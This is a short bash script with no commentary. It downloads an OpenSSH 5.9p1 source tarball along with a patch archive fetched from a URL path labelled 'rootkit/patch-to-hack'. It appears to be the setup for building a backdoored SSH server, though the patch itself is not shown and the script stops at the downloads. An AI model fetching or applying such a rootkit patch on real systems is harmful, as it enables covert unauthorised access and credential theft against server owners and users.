#!/bin/bash
curl -o 0x06-openssh-5.9p1.patch.tar.gz http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
curl -o openssh-5.9p1.tar.gz http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
